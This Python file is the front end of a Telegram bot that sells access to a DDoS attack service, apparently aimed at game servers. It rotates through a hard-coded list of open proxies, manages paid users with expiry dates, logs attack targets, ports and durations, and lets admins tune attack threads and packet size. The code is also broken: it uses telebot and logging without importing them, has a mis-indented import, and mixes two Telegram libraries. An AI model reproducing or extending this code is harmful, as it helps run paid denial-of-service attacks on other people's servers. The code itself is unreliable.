
import subprocess
import datetime
import os
import time
import json
import shutil
 import types
from threading import Timer, Thread
from requests.exceptions import ReadTimeout, ConnectionError
import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import getpass
import string
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Load configuration
CONFIG_FILE = 'config.json'

def update_proxy(): 
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)


config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config['admin_ids'])
USER_FILE = config['user_file']
LOG_FILE = config['log_file']
COOLDOWN_TIME = config['cooldown_time']
USER_COOLDOWN = 300  # Cooldown time for normal users in seconds

bgmi_cooldown = {}
ongoing_attacks = {}
allowed_user_ids = {}
user_cooldowns = {}

# User management functions
def read_users():
    try:
        with open(USER_FILE, 'r') as f:
            users = json.load(f)
            return {user: datetime.datetime.fromisoformat(expiry) for user, expiry in users.items()}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def write_users(users):
    with open(USER_FILE, 'w') as f:
        json.dump({user: expiry.isoformat() for user, expiry in users.items()}, f)

allowed_user_ids = read_users()

def check_expired_users():
    current_time = datetime.datetime.now()
    expired_users = [user for user, expiry in allowed_user_ids.items() if expiry < current_time]
    for user in expired_users:
        del allowed_user_ids[user]
    if expired_users:
        write_users(allowed_user_ids)

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"UserID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.truncate(0)
        return "Logs cleared successfully ✅"
    return "Logs are already cleared. No data found."

# Bot command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_message = (
        "🔰 WELCOME TO DDOS BY ZODVIK 🔰\n\n" )

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 Attack')
    btn_info = types.KeyboardButton('ℹ️ My Info')
    btn_access = types.KeyboardButton('💰 Buy Access!')
    btn_rules = types.KeyboardButton('🔰 Rules')
    
    markup.add(btn_attack, btn_info, btn_access, btn_rules)
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Admin controls for setting threads and byte size
@bot.message_handler(commands=['threads'])
def set_threads(message):
    if str(message.chat.id) in ADMIN_IDS:
        try:
            args = message.text.split()
            if len(args) == 2:
                threads = int(args[1])
                if threads > 0:
                    config['threads'] = threads
                    write_config(config)
                    bot.send_message(message.chat.id, f"Threads updated to {threads}.")
                else:
                    bot.send_message(message.chat.id, "Threads count must be greater than 0.")
            else:
                bot.send_message(message.chat.id, "Usage: /threads <number_of_threads>")
        except ValueError:
            bot.send_message(message.chat.id, "Invalid number of threads.")

@bot.message_handler(commands=['bytes'])
def set_bytes(message):
    if str(message.chat.id) in ADMIN_IDS:
        try:
            args = message.text.split()
            if len(args) == 2:
                bytes_size = int(args[1])
                if bytes_size > 0:
                    config['bytes_size'] = bytes_size
                    write_config(config)
                    bot.send_message(message.chat.id, f"Byte size updated to {bytes_size}.")
                else:
                    bot.send_message(message.chat.id, "Byte size must be greater than 0.")
            else:
                bot.send_message(message.chat.id, "Usage: /bytes <byte_size>")
        except ValueError:
            bot.send_message(message.chat.id, "Invalid byte size.")
